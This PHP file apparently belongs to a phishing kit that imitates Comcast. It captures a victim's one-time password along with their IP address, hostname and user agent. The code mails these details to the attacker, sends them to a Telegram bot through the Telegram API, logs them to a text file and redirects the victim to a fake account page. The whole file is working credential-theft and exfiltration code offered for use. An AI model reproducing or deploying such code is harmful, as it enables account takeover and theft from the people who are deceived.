<?php

session_start();
include ('cid.php');
$ip = getenv("REMOTE_ADDR");
$useragent = $_SERVER['HTTP_USER_AGENT'];
$hostname = gethostbyaddr($ip);

$_SESSION['otp'] = $_POST['otp'];

	$message .= "|------------| @ |--------------|\n";
	$message .= "    -----------o0o^v^o0o---------\n";
	$message .= "|Otp           : ".$_POST['otp']."\n";
	$message .= "    -----------o0o^v^o0o---------\n";
	$message .= "|--------- I N F O X I P ---------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|--- http://ip-api.com/json/.$ip ----\n";
	$message .= "User Agent : ".$hostname."\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|----------- @2025 --------------|\n";
	$send = $to;
	$subject = "Comcast : $hostname";
    mail($send, $subject, $message);  
$tmz= [
                       'text' => 'Comcast Access :
\/============================\/
   /\/\/\/\@2025/\/\/\/\
[Comcast Log  : ] 
┌[👤 otp: '.$_POST['otp'].'
├[🌐 IP : '.$ip.'   
└[📡 User-agent : '.$useragent.'
┗━━━━━━━━━━━━━━━━━━
\/============================\/ 


                                       ',
                                       'chat_id' => $chat_id
                                ];

                            file_get_contents("https://api.telegram.org/bot$api/sendMessage?".http_build_query($tmz) );	

    $tds = fopen("cum3.txt","a");
 fputs($tds,$message);
 fclose($tds);
  header("Location: ./myaccount.php");


?>
